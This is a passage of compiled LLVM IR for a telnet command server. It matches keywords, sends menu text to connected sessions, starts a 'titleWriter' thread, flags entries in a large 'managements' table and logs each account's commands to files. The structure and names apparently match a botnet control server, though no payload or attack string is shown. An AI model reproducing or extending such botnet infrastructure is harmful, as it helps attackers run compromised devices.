  %910 = call i32 (i8*, i8*, ...) @sprintf(i8* %909, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.116, i64 0, i64 0)) #9
  %911 = getelementptr inbounds [80 x i8], [80 x i8]* %56, i64 0, i64 0
  %912 = call i32 (i8*, i8*, ...) @sprintf(i8* %911, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.117, i64 0, i64 0)) #9
  %913 = load i32, i32* %5, align 4
  %914 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i64 0, i64 0
  %915 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i64 0, i64 0
  %916 = call i64 @strlen(i8* %915) #8
  %917 = call i64 @send(i32 %913, i8* %914, i64 %916, i32 16384)
  %918 = icmp eq i64 %917, -1
  br i1 %918, label %919, label %920

919:                                              ; preds = %894
  br label %1336

920:                                              ; preds = %894
  %921 = load i32, i32* %5, align 4
  %922 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %923 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %924 = call i64 @strlen(i8* %923) #8
  %925 = call i64 @send(i32 %921, i8* %922, i64 %924, i32 16384)
  %926 = icmp eq i64 %925, -1
  br i1 %926, label %927, label %928

927:                                              ; preds = %920
  br label %1336

928:                                              ; preds = %920
  %929 = load i32, i32* %5, align 4
  %930 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i64 0, i64 0
  %931 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i64 0, i64 0
  %932 = call i64 @strlen(i8* %931) #8
  %933 = call i64 @send(i32 %929, i8* %930, i64 %932, i32 16384)
  %934 = icmp eq i64 %933, -1
  br i1 %934, label %935, label %936

935:                                              ; preds = %928
  br label %1336

936:                                              ; preds = %928
  %937 = load i32, i32* %5, align 4
  %938 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i64 0, i64 0
  %939 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i64 0, i64 0
  %940 = call i64 @strlen(i8* %939) #8
  %941 = call i64 @send(i32 %937, i8* %938, i64 %940, i32 16384)
  %942 = icmp eq i64 %941, -1
  br i1 %942, label %943, label %944

943:                                              ; preds = %936
  br label %1336

944:                                              ; preds = %936
  %945 = load i32, i32* %5, align 4
  %946 = getelementptr inbounds [80 x i8], [80 x i8]* %53, i64 0, i64 0
  %947 = getelementptr inbounds [80 x i8], [80 x i8]* %53, i64 0, i64 0
  %948 = call i64 @strlen(i8* %947) #8
  %949 = call i64 @send(i32 %945, i8* %946, i64 %948, i32 16384)
  %950 = icmp eq i64 %949, -1
  br i1 %950, label %951, label %952

951:                                              ; preds = %944
  br label %1336

952:                                              ; preds = %944
  %953 = load i32, i32* %5, align 4
  %954 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i64 0, i64 0
  %955 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i64 0, i64 0
  %956 = call i64 @strlen(i8* %955) #8
  %957 = call i64 @send(i32 %953, i8* %954, i64 %956, i32 16384)
  %958 = icmp eq i64 %957, -1
  br i1 %958, label %959, label %960

959:                                              ; preds = %952
  br label %1336

960:                                              ; preds = %952
  %961 = load i32, i32* %5, align 4
  %962 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i64 0, i64 0
  %963 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i64 0, i64 0
  %964 = call i64 @strlen(i8* %963) #8
  %965 = call i64 @send(i32 %961, i8* %962, i64 %964, i32 16384)
  %966 = icmp eq i64 %965, -1
  br i1 %966, label %967, label %968

967:                                              ; preds = %960
  br label %1336

968:                                              ; preds = %960
  %969 = load i32, i32* %5, align 4
  %970 = getelementptr inbounds [80 x i8], [80 x i8]* %56, i64 0, i64 0
  %971 = getelementptr inbounds [80 x i8], [80 x i8]* %56, i64 0, i64 0
  %972 = call i64 @strlen(i8* %971) #8
  %973 = call i64 @send(i32 %969, i8* %970, i64 %972, i32 16384)
  %974 = icmp eq i64 %973, -1
  br i1 %974, label %975, label %976

975:                                              ; preds = %968
  br label %1336

976:                                              ; preds = %968
  %977 = load i8*, i8** %3, align 8
  %978 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %977) #9
  %979 = load i32, i32* %5, align 4
  %980 = call i64 @send(i32 %979, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.53, i64 0, i64 0), i64 13, i32 16384)
  %981 = icmp eq i64 %980, -1
  br i1 %981, label %982, label %983

982:                                              ; preds = %976
  br label %1336

983:                                              ; preds = %976
  br label %342, !llvm.loop !26

984:                                              ; preds = %890
  %985 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %986 = call i8* @strstr(i8* %985, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i64 0, i64 0)) #8
  %987 = icmp ne i8* %986, null
  br i1 %987, label %988, label %1058

988:                                              ; preds = %984
  %989 = load i8*, i8** %3, align 8
  %990 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %989) #9
  %991 = getelementptr inbounds [80 x i8], [80 x i8]* %57, i64 0, i64 0
  %992 = call i32 (i8*, i8*, ...) @sprintf(i8* %991, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.119, i64 0, i64 0)) #9
  %993 = getelementptr inbounds [80 x i8], [80 x i8]* %58, i64 0, i64 0
  %994 = call i32 (i8*, i8*, ...) @sprintf(i8* %993, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.120, i64 0, i64 0)) #9
  %995 = getelementptr inbounds [80 x i8], [80 x i8]* %59, i64 0, i64 0
  %996 = call i32 (i8*, i8*, ...) @sprintf(i8* %995, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.121, i64 0, i64 0)) #9
  %997 = getelementptr inbounds [80 x i8], [80 x i8]* %60, i64 0, i64 0
  %998 = call i32 (i8*, i8*, ...) @sprintf(i8* %997, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.122, i64 0, i64 0)) #9
  %999 = getelementptr inbounds [80 x i8], [80 x i8]* %61, i64 0, i64 0
  %1000 = call i32 (i8*, i8*, ...) @sprintf(i8* %999, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.123, i64 0, i64 0)) #9
  %1001 = getelementptr inbounds [80 x i8], [80 x i8]* %62, i64 0, i64 0
  %1002 = call i32 (i8*, i8*, ...) @sprintf(i8* %1001, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.124, i64 0, i64 0)) #9
  %1003 = load i32, i32* %5, align 4
  %1004 = getelementptr inbounds [80 x i8], [80 x i8]* %57, i64 0, i64 0
  %1005 = getelementptr inbounds [80 x i8], [80 x i8]* %57, i64 0, i64 0
  %1006 = call i64 @strlen(i8* %1005) #8
  %1007 = call i64 @send(i32 %1003, i8* %1004, i64 %1006, i32 16384)
  %1008 = icmp eq i64 %1007, -1
  br i1 %1008, label %1009, label %1010

1009:                                             ; preds = %988
  br label %1336

1010:                                             ; preds = %988
  %1011 = load i32, i32* %5, align 4
  %1012 = getelementptr inbounds [80 x i8], [80 x i8]* %58, i64 0, i64 0
  %1013 = getelementptr inbounds [80 x i8], [80 x i8]* %58, i64 0, i64 0
  %1014 = call i64 @strlen(i8* %1013) #8
  %1015 = call i64 @send(i32 %1011, i8* %1012, i64 %1014, i32 16384)
  %1016 = icmp eq i64 %1015, -1
  br i1 %1016, label %1017, label %1018

1017:                                             ; preds = %1010
  br label %1336

1018:                                             ; preds = %1010
  %1019 = load i32, i32* %5, align 4
  %1020 = getelementptr inbounds [80 x i8], [80 x i8]* %59, i64 0, i64 0
  %1021 = getelementptr inbounds [80 x i8], [80 x i8]* %59, i64 0, i64 0
  %1022 = call i64 @strlen(i8* %1021) #8
  %1023 = call i64 @send(i32 %1019, i8* %1020, i64 %1022, i32 16384)
  %1024 = icmp eq i64 %1023, -1
  br i1 %1024, label %1025, label %1026

1025:                                             ; preds = %1018
  br label %1336

1026:                                             ; preds = %1018
  %1027 = load i32, i32* %5, align 4
  %1028 = getelementptr inbounds [80 x i8], [80 x i8]* %60, i64 0, i64 0
  %1029 = getelementptr inbounds [80 x i8], [80 x i8]* %60, i64 0, i64 0
  %1030 = call i64 @strlen(i8* %1029) #8
  %1031 = call i64 @send(i32 %1027, i8* %1028, i64 %1030, i32 16384)
  %1032 = icmp eq i64 %1031, -1
  br i1 %1032, label %1033, label %1034

1033:                                             ; preds = %1026
  br label %1336

1034:                                             ; preds = %1026
  %1035 = load i32, i32* %5, align 4
  %1036 = getelementptr inbounds [80 x i8], [80 x i8]* %61, i64 0, i64 0
  %1037 = getelementptr inbounds [80 x i8], [80 x i8]* %61, i64 0, i64 0
  %1038 = call i64 @strlen(i8* %1037) #8
  %1039 = call i64 @send(i32 %1035, i8* %1036, i64 %1038, i32 16384)
  %1040 = icmp eq i64 %1039, -1
  br i1 %1040, label %1041, label %1042

1041:                                             ; preds = %1034
  br label %1336

1042:                                             ; preds = %1034
  %1043 = load i32, i32* %5, align 4
  %1044 = getelementptr inbounds [80 x i8], [80 x i8]* %62, i64 0, i64 0
  %1045 = getelementptr inbounds [80 x i8], [80 x i8]* %62, i64 0, i64 0
  %1046 = call i64 @strlen(i8* %1045) #8
  %1047 = call i64 @send(i32 %1043, i8* %1044, i64 %1046, i32 16384)
  %1048 = icmp eq i64 %1047, -1
  br i1 %1048, label %1049, label %1050

1049:                                             ; preds = %1042
  br label %1336

1050:                                             ; preds = %1042
  %1051 = load i8*, i8** %3, align 8
  %1052 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1051) #9
  %1053 = load i32, i32* %5, align 4
  %1054 = call i64 @send(i32 %1053, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.53, i64 0, i64 0), i64 13, i32 16384)
  %1055 = icmp eq i64 %1054, -1
  br i1 %1055, label %1056, label %1057

1056:                                             ; preds = %1050
  br label %1336

1057:                                             ; preds = %1050
  br label %342, !llvm.loop !26

1058:                                             ; preds = %984
  %1059 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1060 = call i8* @strstr(i8* %1059, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.125, i64 0, i64 0)) #8
  %1061 = icmp ne i8* %1060, null
  br i1 %1061, label %1062, label %1146

1062:                                             ; preds = %1058
  %1063 = load i32, i32* %5, align 4
  %1064 = call i64 @send(i32 %1063, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.42, i64 0, i64 0), i64 14, i32 16384)
  %1065 = icmp eq i64 %1064, -1
  br i1 %1065, label %1066, label %1067

1066:                                             ; preds = %1062
  br label %1336

1067:                                             ; preds = %1062
  %1068 = load i32, i32* %5, align 4
  %1069 = getelementptr inbounds [999 x i8], [999 x i8]* %35, i64 0, i64 0
  %1070 = getelementptr inbounds [999 x i8], [999 x i8]* %35, i64 0, i64 0
  %1071 = call i64 @strlen(i8* %1070) #8
  %1072 = call i64 @send(i32 %1068, i8* %1069, i64 %1071, i32 16384)
  %1073 = icmp eq i64 %1072, -1
  br i1 %1073, label %1074, label %1075

1074:                                             ; preds = %1067
  br label %1336

1075:                                             ; preds = %1067
  %1076 = load i32, i32* %5, align 4
  %1077 = getelementptr inbounds [999 x i8], [999 x i8]* %36, i64 0, i64 0
  %1078 = getelementptr inbounds [999 x i8], [999 x i8]* %36, i64 0, i64 0
  %1079 = call i64 @strlen(i8* %1078) #8
  %1080 = call i64 @send(i32 %1076, i8* %1077, i64 %1079, i32 16384)
  %1081 = icmp eq i64 %1080, -1
  br i1 %1081, label %1082, label %1083

1082:                                             ; preds = %1075
  br label %1336

1083:                                             ; preds = %1075
  %1084 = load i32, i32* %5, align 4
  %1085 = getelementptr inbounds [999 x i8], [999 x i8]* %37, i64 0, i64 0
  %1086 = getelementptr inbounds [999 x i8], [999 x i8]* %37, i64 0, i64 0
  %1087 = call i64 @strlen(i8* %1086) #8
  %1088 = call i64 @send(i32 %1084, i8* %1085, i64 %1087, i32 16384)
  %1089 = icmp eq i64 %1088, -1
  br i1 %1089, label %1090, label %1091

1090:                                             ; preds = %1083
  br label %1336

1091:                                             ; preds = %1083
  %1092 = load i32, i32* %5, align 4
  %1093 = getelementptr inbounds [999 x i8], [999 x i8]* %38, i64 0, i64 0
  %1094 = getelementptr inbounds [999 x i8], [999 x i8]* %38, i64 0, i64 0
  %1095 = call i64 @strlen(i8* %1094) #8
  %1096 = call i64 @send(i32 %1092, i8* %1093, i64 %1095, i32 16384)
  %1097 = icmp eq i64 %1096, -1
  br i1 %1097, label %1098, label %1099

1098:                                             ; preds = %1091
  br label %1336

1099:                                             ; preds = %1091
  %1100 = load i32, i32* %5, align 4
  %1101 = getelementptr inbounds [999 x i8], [999 x i8]* %39, i64 0, i64 0
  %1102 = getelementptr inbounds [999 x i8], [999 x i8]* %39, i64 0, i64 0
  %1103 = call i64 @strlen(i8* %1102) #8
  %1104 = call i64 @send(i32 %1100, i8* %1101, i64 %1103, i32 16384)
  %1105 = icmp eq i64 %1104, -1
  br i1 %1105, label %1106, label %1107

1106:                                             ; preds = %1099
  br label %1336

1107:                                             ; preds = %1099
  %1108 = load i32, i32* %5, align 4
  %1109 = getelementptr inbounds [999 x i8], [999 x i8]* %40, i64 0, i64 0
  %1110 = getelementptr inbounds [999 x i8], [999 x i8]* %40, i64 0, i64 0
  %1111 = call i64 @strlen(i8* %1110) #8
  %1112 = call i64 @send(i32 %1108, i8* %1109, i64 %1111, i32 16384)
  %1113 = icmp eq i64 %1112, -1
  br i1 %1113, label %1114, label %1115

1114:                                             ; preds = %1107
  br label %1336

1115:                                             ; preds = %1107
  %1116 = load i32, i32* %5, align 4
  %1117 = getelementptr inbounds [999 x i8], [999 x i8]* %41, i64 0, i64 0
  %1118 = getelementptr inbounds [999 x i8], [999 x i8]* %41, i64 0, i64 0
  %1119 = call i64 @strlen(i8* %1118) #8
  %1120 = call i64 @send(i32 %1116, i8* %1117, i64 %1119, i32 16384)
  %1121 = icmp eq i64 %1120, -1
  br i1 %1121, label %1122, label %1123

1122:                                             ; preds = %1115
  br label %1336

1123:                                             ; preds = %1115
  %1124 = load i32, i32* %5, align 4
  %1125 = getelementptr inbounds [999 x i8], [999 x i8]* %42, i64 0, i64 0
  %1126 = getelementptr inbounds [999 x i8], [999 x i8]* %42, i64 0, i64 0
  %1127 = call i64 @strlen(i8* %1126) #8
  %1128 = call i64 @send(i32 %1124, i8* %1125, i64 %1127, i32 16384)
  %1129 = icmp eq i64 %1128, -1
  br i1 %1129, label %1130, label %1131

1130:                                             ; preds = %1123
  br label %1336

1131:                                             ; preds = %1123
  %1132 = load i32, i32* %5, align 4
  %1133 = getelementptr inbounds [999 x i8], [999 x i8]* %43, i64 0, i64 0
  %1134 = getelementptr inbounds [999 x i8], [999 x i8]* %43, i64 0, i64 0
  %1135 = call i64 @strlen(i8* %1134) #8
  %1136 = call i64 @send(i32 %1132, i8* %1133, i64 %1135, i32 16384)
  %1137 = icmp eq i64 %1136, -1
  br i1 %1137, label %1138, label %1139

1138:                                             ; preds = %1131
  br label %1336

1139:                                             ; preds = %1131
  %1140 = load i8*, i8** %3, align 8
  %1141 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1140) #9
  %1142 = load i32, i32* %5, align 4
  %1143 = sext i32 %1142 to i64
  %1144 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1143
  %1145 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1144, i32 0, i32 0
  store i32 1, i32* %1145, align 4
  br label %1146

1146:                                             ; preds = %1139, %1058
  %1147 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1148 = call i8* @strstr(i8* %1147, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.126, i64 0, i64 0)) #8
  %1149 = icmp ne i8* %1148, null
  br i1 %1149, label %1150, label %1234

1150:                                             ; preds = %1146
  %1151 = load i32, i32* %5, align 4
  %1152 = call i64 @send(i32 %1151, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.42, i64 0, i64 0), i64 14, i32 16384)
  %1153 = icmp eq i64 %1152, -1
  br i1 %1153, label %1154, label %1155

1154:                                             ; preds = %1150
  br label %1336

1155:                                             ; preds = %1150
  %1156 = load i32, i32* %5, align 4
  %1157 = getelementptr inbounds [999 x i8], [999 x i8]* %35, i64 0, i64 0
  %1158 = getelementptr inbounds [999 x i8], [999 x i8]* %35, i64 0, i64 0
  %1159 = call i64 @strlen(i8* %1158) #8
  %1160 = call i64 @send(i32 %1156, i8* %1157, i64 %1159, i32 16384)
  %1161 = icmp eq i64 %1160, -1
  br i1 %1161, label %1162, label %1163

1162:                                             ; preds = %1155
  br label %1336

1163:                                             ; preds = %1155
  %1164 = load i32, i32* %5, align 4
  %1165 = getelementptr inbounds [999 x i8], [999 x i8]* %36, i64 0, i64 0
  %1166 = getelementptr inbounds [999 x i8], [999 x i8]* %36, i64 0, i64 0
  %1167 = call i64 @strlen(i8* %1166) #8
  %1168 = call i64 @send(i32 %1164, i8* %1165, i64 %1167, i32 16384)
  %1169 = icmp eq i64 %1168, -1
  br i1 %1169, label %1170, label %1171

1170:                                             ; preds = %1163
  br label %1336

1171:                                             ; preds = %1163
  %1172 = load i32, i32* %5, align 4
  %1173 = getelementptr inbounds [999 x i8], [999 x i8]* %37, i64 0, i64 0
  %1174 = getelementptr inbounds [999 x i8], [999 x i8]* %37, i64 0, i64 0
  %1175 = call i64 @strlen(i8* %1174) #8
  %1176 = call i64 @send(i32 %1172, i8* %1173, i64 %1175, i32 16384)
  %1177 = icmp eq i64 %1176, -1
  br i1 %1177, label %1178, label %1179

1178:                                             ; preds = %1171
  br label %1336

1179:                                             ; preds = %1171
  %1180 = load i32, i32* %5, align 4
  %1181 = getelementptr inbounds [999 x i8], [999 x i8]* %38, i64 0, i64 0
  %1182 = getelementptr inbounds [999 x i8], [999 x i8]* %38, i64 0, i64 0
  %1183 = call i64 @strlen(i8* %1182) #8
  %1184 = call i64 @send(i32 %1180, i8* %1181, i64 %1183, i32 16384)
  %1185 = icmp eq i64 %1184, -1
  br i1 %1185, label %1186, label %1187

1186:                                             ; preds = %1179
  br label %1336

1187:                                             ; preds = %1179
  %1188 = load i32, i32* %5, align 4
  %1189 = getelementptr inbounds [999 x i8], [999 x i8]* %39, i64 0, i64 0
  %1190 = getelementptr inbounds [999 x i8], [999 x i8]* %39, i64 0, i64 0
  %1191 = call i64 @strlen(i8* %1190) #8
  %1192 = call i64 @send(i32 %1188, i8* %1189, i64 %1191, i32 16384)
  %1193 = icmp eq i64 %1192, -1
  br i1 %1193, label %1194, label %1195

1194:                                             ; preds = %1187
  br label %1336

1195:                                             ; preds = %1187
  %1196 = load i32, i32* %5, align 4
  %1197 = getelementptr inbounds [999 x i8], [999 x i8]* %40, i64 0, i64 0
  %1198 = getelementptr inbounds [999 x i8], [999 x i8]* %40, i64 0, i64 0
  %1199 = call i64 @strlen(i8* %1198) #8
  %1200 = call i64 @send(i32 %1196, i8* %1197, i64 %1199, i32 16384)
  %1201 = icmp eq i64 %1200, -1
  br i1 %1201, label %1202, label %1203

1202:                                             ; preds = %1195
  br label %1336

1203:                                             ; preds = %1195
  %1204 = load i32, i32* %5, align 4
  %1205 = getelementptr inbounds [999 x i8], [999 x i8]* %41, i64 0, i64 0
  %1206 = getelementptr inbounds [999 x i8], [999 x i8]* %41, i64 0, i64 0
  %1207 = call i64 @strlen(i8* %1206) #8
  %1208 = call i64 @send(i32 %1204, i8* %1205, i64 %1207, i32 16384)
  %1209 = icmp eq i64 %1208, -1
  br i1 %1209, label %1210, label %1211

1210:                                             ; preds = %1203
  br label %1336

1211:                                             ; preds = %1203
  %1212 = load i32, i32* %5, align 4
  %1213 = getelementptr inbounds [999 x i8], [999 x i8]* %42, i64 0, i64 0
  %1214 = getelementptr inbounds [999 x i8], [999 x i8]* %42, i64 0, i64 0
  %1215 = call i64 @strlen(i8* %1214) #8
  %1216 = call i64 @send(i32 %1212, i8* %1213, i64 %1215, i32 16384)
  %1217 = icmp eq i64 %1216, -1
  br i1 %1217, label %1218, label %1219

1218:                                             ; preds = %1211
  br label %1336

1219:                                             ; preds = %1211
  %1220 = load i32, i32* %5, align 4
  %1221 = getelementptr inbounds [999 x i8], [999 x i8]* %43, i64 0, i64 0
  %1222 = getelementptr inbounds [999 x i8], [999 x i8]* %43, i64 0, i64 0
  %1223 = call i64 @strlen(i8* %1222) #8
  %1224 = call i64 @send(i32 %1220, i8* %1221, i64 %1223, i32 16384)
  %1225 = icmp eq i64 %1224, -1
  br i1 %1225, label %1226, label %1227

1226:                                             ; preds = %1219
  br label %1336

1227:                                             ; preds = %1219
  %1228 = load i8*, i8** %3, align 8
  %1229 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1228) #9
  %1230 = load i32, i32* %5, align 4
  %1231 = sext i32 %1230 to i64
  %1232 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1231
  %1233 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1232, i32 0, i32 0
  store i32 1, i32* %1233, align 4
  br label %1234

1234:                                             ; preds = %1227, %1146
  %1235 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1236 = call i8* @strstr(i8* %1235, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.127, i64 0, i64 0)) #8
  %1237 = icmp ne i8* %1236, null
  br i1 %1237, label %1238, label %1255

1238:                                             ; preds = %1234
  %1239 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1240 = load i32, i32* %6, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1241
  %1243 = getelementptr inbounds %struct.login_info, %struct.login_info* %1242, i32 0, i32 0
  %1244 = getelementptr inbounds [20 x i8], [20 x i8]* %1243, i64 0, i64 0
  %1245 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1246 = call i32 (i8*, i8*, ...) @sprintf(i8* %1239, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.128, i64 0, i64 0), i8* %1244, i8* %1245) #9
  %1247 = load i32, i32* %5, align 4
  %1248 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1249 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1250 = call i64 @strlen(i8* %1249) #8
  %1251 = call i64 @send(i32 %1247, i8* %1248, i64 %1250, i32 16384)
  %1252 = icmp eq i64 %1251, -1
  br i1 %1252, label %1253, label %1254

1253:                                             ; preds = %1238
  store i8* null, i8** %2, align 8
  br label %1345

1254:                                             ; preds = %1238
  br label %1336

1255:                                             ; preds = %1234
  %1256 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1257 = call i8* @strstr(i8* %1256, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.129, i64 0, i64 0)) #8
  %1258 = icmp ne i8* %1257, null
  br i1 %1258, label %1259, label %1278

1259:                                             ; preds = %1255
  %1260 = load i32, i32* %6, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1261
  %1263 = getelementptr inbounds %struct.login_info, %struct.login_info* %1262, i32 0, i32 0
  %1264 = getelementptr inbounds [20 x i8], [20 x i8]* %1263, i64 0, i64 0
  %1265 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1266 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.130, i64 0, i64 0), i8* %1264, i8* %1265)
  %1267 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.131, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %1267, %struct._IO_FILE** %63, align 8
  %1268 = load %struct._IO_FILE*, %struct._IO_FILE** %63, align 8
  %1269 = load i32, i32* %6, align 4
  %1270 = sext i32 %1269 to i64
  %1271 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1270
  %1272 = getelementptr inbounds %struct.login_info, %struct.login_info* %1271, i32 0, i32 0
  %1273 = getelementptr inbounds [20 x i8], [20 x i8]* %1272, i64 0, i64 0
  %1274 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1275 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1268, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.130, i64 0, i64 0), i8* %1273, i8* %1274)
  %1276 = load %struct._IO_FILE*, %struct._IO_FILE** %63, align 8
  %1277 = call i32 @fclose(%struct._IO_FILE* %1276)
  br label %1336

1278:                                             ; preds = %1255
  %1279 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1280 = call i8* @strstr(i8* %1279, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.132, i64 0, i64 0)) #8
  %1281 = icmp ne i8* %1280, null
  br i1 %1281, label %1282, label %1301

1282:                                             ; preds = %1278
  %1283 = load i32, i32* %6, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1284
  %1286 = getelementptr inbounds %struct.login_info, %struct.login_info* %1285, i32 0, i32 0
  %1287 = getelementptr inbounds [20 x i8], [20 x i8]* %1286, i64 0, i64 0
  %1288 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1289 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.130, i64 0, i64 0), i8* %1287, i8* %1288)
  %1290 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.131, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %1290, %struct._IO_FILE** %64, align 8
  %1291 = load %struct._IO_FILE*, %struct._IO_FILE** %64, align 8
  %1292 = load i32, i32* %6, align 4
  %1293 = sext i32 %1292 to i64
  %1294 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1293
  %1295 = getelementptr inbounds %struct.login_info, %struct.login_info* %1294, i32 0, i32 0
  %1296 = getelementptr inbounds [20 x i8], [20 x i8]* %1295, i64 0, i64 0
  %1297 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1298 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1291, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.130, i64 0, i64 0), i8* %1296, i8* %1297)
  %1299 = load %struct._IO_FILE*, %struct._IO_FILE** %64, align 8
  %1300 = call i32 @fclose(%struct._IO_FILE* %1299)
  br label %1336

1301:                                             ; preds = %1278
  %1302 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %1302)
  %1303 = load i32, i32* %5, align 4
  %1304 = call i64 @send(i32 %1303, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.53, i64 0, i64 0), i64 13, i32 16384)
  %1305 = icmp eq i64 %1304, -1
  br i1 %1305, label %1306, label %1307

1306:                                             ; preds = %1301
  br label %1336

1307:                                             ; preds = %1301
  %1308 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1309 = call i64 @strlen(i8* %1308) #8
  %1310 = icmp eq i64 %1309, 0
  br i1 %1310, label %1311, label %1312

1311:                                             ; preds = %1307
  br label %342, !llvm.loop !26

1312:                                             ; preds = %1307
  %1313 = load i32, i32* %6, align 4
  %1314 = sext i32 %1313 to i64
  %1315 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1314
  %1316 = getelementptr inbounds %struct.login_info, %struct.login_info* %1315, i32 0, i32 0
  %1317 = getelementptr inbounds [20 x i8], [20 x i8]* %1316, i64 0, i64 0
  %1318 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1319 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.133, i64 0, i64 0), i8* %1317, i8* %1318)
  %1320 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.134, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %1320, %struct._IO_FILE** %65, align 8
  %1321 = load %struct._IO_FILE*, %struct._IO_FILE** %65, align 8
  %1322 = load i32, i32* %6, align 4
  %1323 = sext i32 %1322 to i64
  %1324 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1323
  %1325 = getelementptr inbounds %struct.login_info, %struct.login_info* %1324, i32 0, i32 0
  %1326 = getelementptr inbounds [20 x i8], [20 x i8]* %1325, i64 0, i64 0
  %1327 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
